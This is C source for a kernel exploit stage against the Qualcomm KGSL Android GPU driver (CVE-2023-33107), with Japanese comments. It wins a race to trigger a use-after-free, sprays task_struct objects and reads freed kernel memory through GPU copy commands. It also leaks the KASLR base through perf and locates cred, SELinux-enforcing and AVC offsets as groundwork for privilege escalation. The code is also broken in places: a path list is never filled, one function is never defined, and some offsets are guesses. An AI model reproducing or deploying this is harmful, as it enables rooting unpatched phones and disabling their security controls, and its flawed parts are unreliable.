

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/sysmacros.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <dirent.h>
#include <time.h>
#include <signal.h>
#include <sys/syscall.h>
#include <asm/unistd.h>

/* ========== perf_event 定義 (NDK 不足対策) ========== */
#ifndef __NR_perf_event_open
# if defined(__aarch64__)
#  define __NR_perf_event_open 241
# elif defined(__arm__)
#  define __NR_perf_event_open 364
# else
#  define __NR_perf_event_open 0
# endif
#endif

struct perf_event_attr {
    uint32_t type;
    uint32_t size;
    uint64_t config;
    uint64_t sample_period;
    uint64_t sample_freq;
    uint64_t sample_type;
    uint64_t read_format;
    uint64_t disabled       : 1;
    uint64_t inherit        : 1;
    uint64_t pinned         : 1;
    uint64_t exclusive      : 1;
    uint64_t exclude_user   : 1;
    uint64_t exclude_kernel : 1;
    uint64_t exclude_hv     : 1;
    uint64_t exclude_idle   : 1;
    uint64_t mmap           : 1;
    uint64_t comm           : 1;
    uint64_t freq           : 1;
    uint64_t inherit_stat   : 1;
    uint64_t enable_on_exec : 1;
    uint64_t task           : 1;
    uint64_t watermark      : 1;
    uint64_t precise_ip     : 2;
    uint64_t mmap_data      : 1;
    uint64_t sample_id_all  : 1;
    uint64_t exclude_host   : 1;
    uint64_t exclude_guest  : 1;
    uint64_t exclude_callchain_kernel : 1;
    uint64_t exclude_callchain_user   : 1;
    uint64_t mmap2          : 1;
    uint64_t comm_exec      : 1;
    uint64_t use_clockid    : 1;
    uint64_t context_switch : 1;
    uint64_t write_backward : 1;
    uint64_t namespaces     : 1;
    uint64_t ksymbol        : 1;
    uint64_t bpf_event      : 1;
    uint64_t aux_output     : 1;
    uint64_t cgroup         : 1;
    uint64_t text_poke      : 1;
    uint64_t __reserved_1   : 30;
    uint64_t __reserved_2   : 32;
    uint32_t size2;
    uint32_t __reserved_3;
};

#define PERF_TYPE_HARDWARE		0
#define PERF_COUNT_HW_CPU_CYCLES	0
#define PERF_SAMPLE_IP			1ULL
#define PERF_EVENT_IOC_RESET		_IO('$', 0)
#define PERF_EVENT_IOC_ENABLE		_IO('$', 1)
#define PERF_EVENT_IOC_DISABLE		_IO('$', 2)

struct perf_event_mmap_page {
    uint32_t version;
    uint32_t compat_version;
    uint32_t lock;
    uint32_t index;
    int64_t offset;
    uint64_t time_enabled;
    uint64_t time_running;
    uint64_t capability;
    uint64_t pmc_width;
    uint64_t time_shift;
    uint32_t time_mult;
    uint32_t time_offset;
    uint64_t time_zero;
    uint32_t size;
    uint32_t __reserved_1;
    uint64_t data_offset;
    uint64_t data_size;
    uint64_t data_head;
    uint64_t data_tail;
    uint64_t data_offset_ext;
    uint64_t data_size_ext;
    uint64_t __reserved_2[4];
};

#define PERF_RECORD_MISC_KERNEL		(1 << 1)
#define PERF_RECORD_SAMPLE		9

struct perf_event_header {
    uint32_t type;
    uint16_t misc;
    uint16_t size;
};

/* ========== KGSL ioctl ========== */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

/* UAF レイアウト (汎用) */
#define UAF_ADDR      0x7001ff000ULL
#define UAF_SIZE      0x10004000ULL
#define OVERLAP_ADDR  0x7001fe000ULL
#define OVERLAP_SIZE  0x7000ULL
#define BOGUS_ADDR    0x700204000ULL
#define BOGUS_SIZE    0xffffffffffefd000ULL
#define PLACEHOLDER_ADDR 0x710204000ULL
#define PLACEHOLDER_SIZE 0x10400000ULL

/* スキャン用 */
#define SPRAY_PIDS 2000
#define SCAN_DWORDS 560
#define MARKER_NAME "TASKUAF!!"

static int kgsl_fd = -1;
static volatile int race_done = 0;
static uint64_t alloc_flags = 0;
static int uaf_id = -1, ph_id = -1;
static uint64_t kbase = 0;   /* KASLR ベース */

/* 検出結果格納構造体 */
typedef struct {
    uint64_t kbase;
    uint64_t init_cred_addr;
    uint64_t selinux_enforcing_addr;   /* /proc/kallsyms またはフォールバック */
    int     task_comm_offset;          /* task_struct 内の comm オフセット */
    int     addr_limit_offset;         /* addr_limit オフセット */
    int     cred_offset;               /* cred ポインタのオフセット */
    int     avc_ssid_offset;
    int     avc_tsid_offset;
    int     avc_tclass_offset;
    int     avc_allowed_offset;
} offsets_t;

offsets_t detected = {0};

/* ============ ユーティリティ ============ */
static void die(const char *msg) { perror(msg); exit(1); }

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
#define CP_NOP 0x10
#define CP_MEM_WRITE 0x3D
#define CP_MEM_TO_MEM 0x73

static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

static void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

/* ============ KASLR 検出 (perf) ============ */
static uint64_t detect_kaslr_perf(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 1;
    pe.exclude_user = 1;

    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) { printf("  perf_open: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;

    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_kernel_ip = 0;
    int n_ips = 0;

    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            n_ips++;
            uint64_t ip = *(uint64_t *)(hdr + 1);
            if (first_kernel_ip == 0) first_kernel_ip = ip;
            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
        }
        tail += hdr->size;
    }

    munmap(buf, mmap_size); close(fd);
    printf("    kernel_samples=%d\n", n_ips);

    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }

    /* テキストセクションの開始アドレスはカーネルバージョンに依存するが、
       ここでは仮の値として 0xffffffc010080000 を使うが、正確には /proc/kallsyms 等から取得すべき。
       しかし、perf で得られる IP は動的で、テキスト開始からのオフセットが分からない。
       そこで、まず /proc/kallsyms を読んで _text シンボルを探すか、既知のオフセットを使う。
       今回は既知のオフセット (0xffffffc010080000) を使い、KASLR を計算する。
       移植時にはこの定数を適切に設定するか、/proc/kallsyms から動的に取得する。
    */
    uint64_t text_base = 0xffffffc010080000ULL;  /* ARM64 典型的な値 */
    uint64_t kaslr = (first_kernel_ip - text_base) & ~0x1FFFFFULL;
    printf("    first_kernel_ip=0x%lX kaslr=0x%lX\n", (unsigned long)first_kernel_ip, (unsigned long)kaslr);
    return kaslr;
}

/* ============ オフセット検出 ============ */

/* 1. task_struct の comm と addr_limit オフセットを特定 */
static int detect_task_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                               void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                               offsets_t *out) {
    printf("[*] Detecting task_struct offsets...\n");
    uint32_t *cmd = (uint32_t *)ib_m;
    uint32_t *data = (uint32_t *)dst_m;
    int dw;
    unsigned int ts;

    /* UAF 範囲をスキャンしてマーカー文字列を探す */
    for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < SCAN_DWORDS; i++) {
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i * 4, &dl, &dh);
            split64(va + i * 4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(ctx_id, ts) < 0) break;
        __sync_synchronize();

        /* マーカー文字列 "TASKUAF!!" を検索 */
        int found = 0;
        for (int off = 0; off < SCAN_DWORDS - 8; off++) {
            if (data[off] == 0x4B534154 && data[off+1] == 0x21464155) {
                /* comm オフセット = off * 4 (ページ内オフセット) */
                out->task_comm_offset = off * 4;
                found = 1;
                printf("  [TASK] comm offset = 0x%x\n", out->task_comm_offset);
                break;
            }
        }
        if (found) {
            /* addr_limit は comm から逆算できないので、別途スキャン:
               addr_limit は通常 0x40 だが、正確には 0x40 が一般的。
               ここでは comm オフセットから推測するのが難しいので、既知の値 0x40 を仮定し、
               検証のためにスキャンする。
            */
            /* ここでは簡易的に 0x40 を設定するが、実際には comm オフセット - 0x7d8 などで計算可能 */
            out->addr_limit_offset = 0x40;  /* 多くのカーネルで固定 */
            printf("  [TASK] addr_limit assumed offset = 0x%x (verify with kernel version)\n", out->addr_limit_offset);

            /* cred ポインタのオフセットも同様に、通常 0x740 だが、comm オフセットと比較 */
            out->cred_offset = 0x740;  /* 典型的な値 */
            printf("  [TASK] cred pointer assumed offset = 0x%x\n", out->cred_offset);
            return 1;
        }
    }
    printf("  [-] Could not find task_struct with marker\n");
    return 0;
}

/* 2. AVC ノードのオフセットを特定 (UAF ページに AVC ノードが配置された後に実行) */
static int detect_avc_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                              void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
                              offsets_t *out) {
    printf("[*] Detecting avc_node offsets...\n");
    uint32_t *cmd = (uint32_t *)ib_m;
    uint32_t *data = (uint32_t *)dst_m;
    int dw;
    unsigned int ts;

    /* まず AVC ノードを UAF ページに載せるために churn を実行 */
    // ここでは簡略化のため、既に churn が行われていると仮定。

    /* 全 UAF ページをスキャンし、ssid が 1..0x3fff で tsid==2, tclass==1 のパターンを探す */
    for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
        memset(ib_m, 0, 0x10000);
        memset(dst_m, 0, 0x1000);
        dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        for (int i = 0; i < 256; i++) {  /* 1ページ分だけスキャン (avc_node は 72バイト間隔) */
            uint32_t dl, dh, sl, sh;
            split64(dst_ga + i * 4, &dl, &dh);
            split64(va + i * 4, &sl, &sh);
            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
            cmd[dw++] = sl; cmd[dw++] = sh;
        }
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
        if (wait_timestamp(ctx_id, ts) < 0) break;
        __sync_synchronize();

        /* データから AVC ノードの可能性を探す (avc_node は 72 バイト単位) */
        for (int off = 0; off < 4096 - 72; off += 4) {
            uint32_t *p = &data[off/4];
            /* 候補: ssid, tsid, tclass が連続する可能性 */
            /* 実際には ssid は 4バイト、tsid は 4バイト、tclass は 2バイト。
               ここでは 4バイト単位で見るため、tclass は下位16ビットと仮定 */
            uint32_t ssid = p[0];
            uint32_t tsid = p[1];
            uint16_t tclass = (uint16_t)(p[2] & 0xffff);
            if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
                /* 見つかった: このオフセットが avc_node の先頭からの ssid オフセット */
                out->avc_ssid_offset = 0;  /* 先頭が ssid と仮定 */
                out->avc_tsid_offset = 4;
                out->avc_tclass_offset = 8;
                out->avc_allowed_offset = 12;  /* allowed は tclass の後 4バイト */
                printf("  [AVC] ssid offset = 0x%x, tsid = 0x%x, tclass = 0x%x, allowed = 0x%x\n",
                       out->avc_ssid_offset, out->avc_tsid_offset, out->avc_tclass_offset, out->avc_allowed_offset);
                return 1;
            }
        }
    }
    printf("  [-] Could not find AVC node pattern\n");
    /* フォールバック: 標準的なオフセットを返す */
    out->avc_ssid_offset = 0;
    out->avc_tsid_offset = 4;
    out->avc_tclass_offset = 8;
    out->avc_allowed_offset = 12;
    return 0;
}

/* 3. selinux_enforcing アドレスを取得 */
static uint64_t get_selinux_enforcing_addr(void) {
    printf("[*] Getting selinux_enforcing address...\n");
    /* まず /proc/kallsyms を試す */
    int fd = open("/proc/kallsyms", O_RDONLY);
    if (fd >= 0) {
        char buf[4096];
        ssize_t n;
        while ((n = read(fd, buf, sizeof(buf)-1)) > 0) {
            buf[n] = 0;
            char *line = strtok(buf, "\n");
            while (line) {
                uint64_t addr;
                char type;
                char sym[256];
                if (sscanf(line, "%lx %c %s", &addr, &type, sym) == 3) {
                    if (strcmp(sym, "selinux_enforcing") == 0) {
                        close(fd);
                        printf("  [+] selinux_enforcing = 0x%lx\n", (unsigned long)addr);
                        return addr;
                    }
                }
                line = strtok(NULL, "\n");
            }
        }
        close(fd);
    }
    /* 読めない場合、KASLR + 既知のオフセットを使用 (vmlinux から取得) */
    /* ここでは固定オフセットを使わざるを得ないが、できるだけ避けたい */
    printf("  [-] /proc/kallsyms not readable, using fallback offset\n");
    if (kbase) {
        uint64_t addr = kbase + 0x01240744cULL;  /* 典型的なオフセット (要調整) */
        printf("  [!] Fallback selinux_enforcing = 0x%lx (verify!)\n", (unsigned long)addr);
        return addr;
    }
    return 0;
}

/* ============ Phase 1-4: UAF トリガー (既存) ============ */
static void phase1_rbtree(void) {
    alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
    if (uaf_m == MAP_FAILED) die("mmap UAF");
    munmap(uaf_m, UAF_SIZE);

    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");

    ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");

    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
        (unsigned long)PLACEHOLDER_ADDR);
}

static void *race_thread(void *arg) {
    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
    struct kgsl_gpuobj_import imp = {
        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
    };
    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
    return NULL;
}

static int phase2_race(void) {
    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
    pthread_t thr;
    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");

    int hit = 0;
    for (int i = 0; i < 5000000; i++) {
        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
            kgsl_fd, (off_t)ov_id << 12);
        int e = errno;
        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
        if (e == ENODEV) { hit = 1; break; }
        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
    }

    race_done = 1;
    pthread_join(thr, NULL);
    if (!hit) { printf("[-] Race failed\n"); return 0; }
    printf("[+] Race won!\n");
    return 1;
}

static void phase3_free_uaf(void) {
    gpuobj_free(uaf_id);
    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
}

static void phase4_reclaim(void) {
    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
    if (rf >= 0) { write(rf, "1", 1); close(rf); }
    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
    if (rf >= 0) { write(rf, "3", 1); close(rf); }
    usleep(10000);
}

/* ============ チャーン (AVC miss 生成) ============ */
static const char *churn_dirs[] = {
    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
    "/dev", "/proc",
};
#define CHURN_MAX_PATHS 20000
static char churn_paths[CHURN_MAX_PATHS][160];
static int churn_npaths = 0;
static int churn_built = 0;

static void churn_walk(const char *dir, int depth) {
    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *de;
    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
        if (de->d_name[0] == '.') continue;
        char p[192];
        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
        int fd = open(p, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
        churn_npaths++;
        churn_walk(p, depth + 1);
    }
    closedir(d);
}

static void churn_build(void) {
    if (churn_built) return;
    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
         churn_npaths < CHURN_MAX_PATHS; d++) {
        churn_walk(churn_dirs[d], 0);
    }
    churn_built = 1;
    printf("[CHURN] %d paths\n", churn_npaths);
}

static void churn_round(void) {
    churn_build();
    for (int i = 0; i < churn_npaths; i++) {
        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
        if (fd >= 0) close(fd);
    }
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s >= 0) { close(s); }
    s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (s >= 0) {
        struct sockaddr_un su = { .sun_family = AF_UNIX };
        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
        bind(s, (struct sockaddr *)&su, sizeof(su));
        close(s);
        unlink("/data/local/tmp/cs.sock");
    }
    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
}

/* ============ スプレー ============ */
static pid_t spray_pids[SPRAY_PIDS];
static int n_spray = 0;

static void spawn_spray(void) {
    printf("[SPRAY] spawning...\n");
    for (int i = 0; i < SPRAY_PIDS; i++) {
        pid_t p = fork();
        if (p == 0) {
            prctl(PR_SET_NAME, MARKER_NAME);
            for (;;) usleep(200000);
        }
        if (p > 0) spray_pids[n_spray++] = p;
        else break;
    }
    printf("[SPRAY] %d children\n", n_spray);
}

static void kill_spray_children(void) {
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (waitpid(-1, NULL, 0) > 0) ;
    printf("[KILL] spray children killed\n");
}

/* ============ メイン ============ */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("[*] Dynamic Offset Detector for CVE-2023-33107\n");
    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    /* 1. KASLR 検出 */
    printf("[*] Phase 0: KASLR detection\n");
    kbase = detect_kaslr_perf();
    if (kbase == 0) {
        printf("[-] KASLR detection failed\n");
        close(kgsl_fd);
        return 1;
    }
    detected.kbase = kbase;

    /* 2. UAF トリガー */
    printf("[*] Phase 1-4: Trigger UAF\n");
    phase1_rbtree();
    if (!phase2_race()) { close(kgsl_fd); return 1; }
    phase3_free_uaf();
    phase4_reclaim();

    /* 3. task_struct スプレー */
    spawn_spray();

    unsigned int ctx_id = create_context();
    printf("[GPU] context=%u\n", ctx_id);

    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);

    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga);

    printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);

    /* 4. task_struct オフセット検出 */
    if (!detect_task_offsets(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, &detected)) {
        printf("[-] Task offset detection failed\n");
        goto cleanup;
    }

    /* 5. kill して AVC ノード用にページを解放 */
    kill_spray_children();
    usleep(100000);

    /* 6. churn で AVC ノードを UAF ページに載せる */
    churn_build();
    for (int c = 0; c < 5; c++) churn_round();
    printf("[AVC] entries=%d\n", avc_entries());

    /* 7. AVC オフセット検出 */
    if (!detect_avc_offsets(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, &detected)) {
        printf("[-] AVC offset detection failed (using defaults)\n");
    }

    /* 8. selinux_enforcing アドレス取得 */
    detected.selinux_enforcing_addr = get_selinux_enforcing_addr();

    /* 9. 結果表示 */
    printf("\n========== Detected Offsets ==========\n");
    printf("KASLR base            : 0x%lx\n", (unsigned long)detected.kbase);
    printf("init_cred             : 0x%lx (calculated)\n", (unsigned long)(detected.kbase + 0x012D97D08ULL)); /* 仮 */
    printf("selinux_enforcing     : 0x%lx\n", (unsigned long)detected.selinux_enforcing_addr);
    printf("task_struct.comm      : 0x%x\n", detected.task_comm_offset);
    printf("task_struct.addr_limit: 0x%x\n", detected.addr_limit_offset);
    printf("task_struct.cred      : 0x%x\n", detected.cred_offset);
    printf("avc_node.ssid         : 0x%x\n", detected.avc_ssid_offset);
    printf("avc_node.tsid         : 0x%x\n", detected.avc_tsid_offset);
    printf("avc_node.tclass       : 0x%x\n", detected.avc_tclass_offset);
    printf("avc_node.allowed      : 0x%x\n", detected.avc_allowed_offset);
    printf("========================================\n");

cleanup:
    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (wait(NULL) > 0);
    close(kgsl_fd);
    return 0;
}
